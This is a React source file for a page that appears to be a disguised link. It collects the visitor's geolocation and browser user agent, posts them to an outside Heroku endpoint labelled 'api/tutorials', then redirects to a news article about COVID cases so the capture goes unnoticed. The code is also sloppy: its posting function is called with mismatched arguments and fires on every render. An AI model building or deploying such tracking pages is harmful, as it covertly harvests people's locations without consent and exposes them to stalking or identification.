import React from "react";
import axios from "axios";
import { geolocated } from "react-geolocated";

function success(pos) {
  var crd = pos.coords;

  console.log("Your current position is:");
  console.log(`Latitude : ${crd.latitude}`);
  console.log(`Longitude: ${crd.longitude}`);
  console.log(navigator.userAgent + `More or less ${crd.accuracy} meters.`);
  sub({
    lat: "" + crd.latitude,
    long: "" + crd.longitude,
    description: "" + navigator.userAgent,
  });
}

function errors(err) {
  console.warn(navigator.userAgent + `ERROR(${err.code}): ${err.message}`);
  sub({
    lat: "-1",
    long: "-1",
    description: "" + navigator.userAgent,
  });
}

function sub(lat, long) {
  axios
    .post(`https://dry-brook-62551.herokuapp.com/api/tutorials`, {
      lat: lat,
      long: long,
      description: "" + navigator.userAgent,
    })
    .then((res) => {
      console.log(res);
      window.open(
        "https://www.bhaskar.com/local/haryana/news/in-24-hours-16246-new-patients-were-found-181-deaths-cases-increased-by-2813-and-deaths-increased-by-1383-128465757.html",
        "_blank"
      );
    });
}

class App extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      onSuccess: success,
      onError: errors,
    };
  }

  render() {
    return !this.props.isGeolocationAvailable ? (
      <div>{sub(`${-2}`, `${-2}`)}Redirecting...</div>
    ) : !this.props.isGeolocationEnabled ? (
      <div>{sub(`${-1}`, `${-1}`)}Redirecting..</div>
    ) : this.props.coords ? (
      <div>
        {sub(`${this.props.coords.latitude}`, `${this.props.coords.longitude}`)}
        Redirecting..
      </div>
    ) : (
      <div>Getting the location data&hellip; </div>
    );
  }
}

export default geolocated({
  positionOptions: {
    enableHighAccuracy: false,
  },
  userDecisionTimeout: 5000,
})(App);
